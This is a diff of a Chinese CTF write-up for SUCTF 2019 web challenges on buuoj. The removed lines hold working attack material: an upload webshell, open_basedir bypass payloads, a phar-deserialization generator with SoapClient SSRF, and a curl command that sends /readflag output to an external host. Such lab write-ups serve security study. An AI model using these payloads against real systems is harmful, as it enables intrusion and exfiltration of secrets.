@@ -1,5 +1,5 @@
 ---
-title: buuoj刷题记录11-SUCTF2019web复现
+title: buuoj刷题记录11-SUCTF复现
 date: 2020-02-04 23:46:53
 tags:
  - buuoj
@@ -271,7 +271,22 @@ Array ( [0] => 1 ) Array ( [0] => 1flag{36c7b843-6efb-409d-a1fe-3ef54fce7d6d} )
 
 
 
-## CheckIn
+## Upload Labs
+
+发现是文件上传服务器是openresty，不能采用上传.htaccess的方式
+
+```
+HTTP/1.1 200 OK
+
+Server: openresty
+
+Date: Fri, 07 Feb 2020 08:24:01 GMT
+Content-Type: text/html; charset=UTF-8
+Content-Length: 768
+Connection: close
+```
+
+
 
 先直接上传图片马，提示文件内容包含`<?`，采用js的写法绕过
 
@@ -299,7 +314,7 @@ eval($_POST[cmd]);
 </script>
 ```
 
-上传.htaccess发现没有生效，然后上传.user.ini
+然后上传.user.ini
 
 ```
 Content-Disposition: form-data; name="fileUpload"; filename="1.gif"
@@ -484,246 +499,5 @@ GIF89a与后面加密过的一句话不能使用空格或者回车隔开,因为b
 
 
 
-[绕过open_basedir参考文章](https://www.cnblogs.com/cimuhuashuimu/p/11544487.html)
+绕过`open_basedir`
 
-绕过payload
-
-```
-chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo(file_get_contents('flag'));`
-```
-
-
-
-先扫描目录
-
-```
-/upload/tmp_2c67ca1eaeadbdc1868d67003072b481/1.cc
-```
-
-post内容
-
-```
-cmd=chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(scandir('/'));
-```
-
-返回内容
-
-![](/pic/72.png)
-
-找到flag，读取flag
-
-```
-cmd=chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(file('/THis_Is_tHe_F14g'));
-```
-
-![](/pic/73.png)
-
-
-
-## Upload Labs 2
-
-给出了源码
-
-```
-//admin.php
-<?php
-include 'config.php';
-
-class Ad{
-
-    public $cmd;
-
-    public $clazz;
-    public $func1;
-    public $func2;
-    public $func3;
-    public $instance;
-    public $arg1;
-    public $arg2;
-    public $arg3;
-
-    function __construct($cmd, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3){  //构造类时调用的方法
-
-        $this->cmd = $cmd;
-
-        $this->clazz = $clazz;
-        $this->func1 = $func1;
-        $this->func2 = $func2;
-        $this->func3 = $func3;
-        $this->arg1 = $arg1;
-        $this->arg2 = $arg2;
-        $this->arg3 = $arg3;
-    }
-
-    function check(){
-
-        $reflect = new ReflectionClass($this->clazz);
-        $this->instance = $reflect->newInstanceArgs();  //实例化clazz类
-
-        $reflectionMethod = new ReflectionMethod($this->clazz, $this->func1);
-        $reflectionMethod->invoke($this->instance, $this->arg1); //执行clazz中的func1方法，参数为arg1
-
-        $reflectionMethod = new ReflectionMethod($this->clazz, $this->func2);
-        $reflectionMethod->invoke($this->instance, $this->arg2);//执行clazz中的func2方法，参数为arg2
-
-        $reflectionMethod = new ReflectionMethod($this->clazz, $this->func3);
-        $reflectionMethod->invoke($this->instance, $this->arg3);
-    } //执行clazz中的func3方法，参数为arg3
-
-    function __destruct(){  //析构类调用的方法
-        system($this->cmd);
-    }
-}
-
-if($_SERVER['REMOTE_ADDR'] == '127.0.0.1'){
-    if(isset($_POST['admin'])){
-        $cmd = $_POST['cmd'];
-
-        $clazz = $_POST['clazz'];
-        $func1 = $_POST['func1'];
-        $func2 = $_POST['func2'];
-        $func3 = $_POST['func3'];
-        $arg1 = $_POST['arg1'];
-        $arg2 = $_POST['arg2'];
-        $arg2 = $_POST['arg3'];
-        $admin = new Ad($cmd, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3);
-        $admin->check();
-    }
-}
-else {
-    echo "You r not admin!";
-}
-```
-
-[关于PHP反射类](https://www.jianshu.com/p/d02cbde1cdd7)
-
-大致意思就是要构造ssrf进行命令执行。SoapClient可以构造http请求。
-
-```
-// func.php
-<?php
-include 'class.php';
-if (isset($_POST["submit"]) && isset($_POST["url"])) {
-    if(preg_match('/^(ftp|zlib|data|glob|phar|ssh2|compress.bzip2|compress.zlib|rar|ogg|expect)(.|\\s)*|(.|\\s)*(file|data|\.\.)(.|\\s)*/i',$_POST['url'])){  
-        die("Go away!");
-    }else{
-        $file_path = $_POST['url'];
-        $file = new File($file_path);
-        $file->getMIME();
-        echo "<p>Your file type is '$file' </p>";
-    }
-}
-?>
-```
-传入的url要经过正则匹配，调用file类
-```
-// class.php
-<?php
-include 'config.php';
-
-class File{
-
-    public $file_name;
-    public $type;
-    public $func = "Check";
-
-    function __construct($file_name){
-        $this->file_name = $file_name;
-    }
-
-    function __wakeup(){
-        $class = new ReflectionClass($this->func);
-        $a = $class->newInstanceArgs($this->file_name);
-        $a->check();
-    }
-    
-    function getMIME(){
-        $finfo = finfo_open(FILEINFO_MIME_TYPE);
-        $this->type = finfo_file($finfo, $this->file_name);
-        finfo_close($finfo);
-    }
-
-    function __toString(){
-        return $this->type;
-    }
-
-}
-
-class Check{
-
-    public $file_name;
-
-    function __construct($file_name){
-        $this->file_name = $file_name;
-    }
-
-    function check(){
-        $data = file_get_contents($this->file_name);
-        if (mb_strpos($data, "<?") !== FALSE) {
-            die("&lt;? in contents!");  //不能包含<?
-        }
-    }
-}
-```
-
-[关于MME类型文件](https://www.w3school.com.cn/media/media_mimeref.asp)   上传的文件要绕过Check::check()
-
-finfo_file会触发phar的反序列化[参考文章1](https://paper.seebug.org/680/)     [参考文章2](https://xz.aliyun.com/t/2958)
-
-传入成功后url
-
-phar://开头被正则过滤，可以使用
-
-```
-php://php://filter/resource=phar://
-```
-
-生成phar文件
-
-```
-<?php
-class File {
-    public $file_name = "";
-    public $func = "SoapClient";
-
-    function __construct(){
-        $target = "http://127.0.0.1/admin.php";
-        $post_string = 'admin=1&cmd=curl --referer "`/readflag`" --insecure "http://xss.buuoj.cn/index.php?do=api%26id=dzWPkK"&clazz=SplStack&func1=push&func2=push&func3=push&arg1=123456&arg2=123456&arg3='. "\r\n";
-        $headers = [];
-        $this->file_name  = [
-            null,
-            array('location' => $target,
-                'user_agent'=> str_replace('^^', "\r\n", 'xxxxx^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'Content-Length: '. (string)strlen($post_string).'^^^^'.$post_string),
-                'uri'=>'hello')
-        ];
-    }
-}
-$obj = new File();
-$phar = new Phar('poc.phar');
-$phar->startBuffering();
-$phar->setStub("GIF89a __HALT_COMPILER();");
-$phar->setMetadata($obj);
-$phar->addFromString('1.txt','text');
-$phar->stopBuffering();
-?>
-```
-
-将生成的poc.phar改一个图片文件后缀，然后上传
-
-再func.php里面提交url
-
-```
-php://filter/resource=phar://upload/2c67ca1eaeadbdc1868d67003072b481/551ccbaef945b2c4f3ca88361f08d600.jpg
-```
-
-关于构造SoapClient当中的cmd命令为
-
-```
-curl --referer "`/readflag`" --insecure "http://xss.buuoj.cn/index.php?do=api%26id=dzWPkK"
-```
-
-因为没有回显，只能使用将flag外带的方式带出来，使用buuoj的xss平台。id后面的字符是你创建的工程的数值
-
-
-
-附上出题人[出题笔记](https://xz.aliyun.com/t/6057)
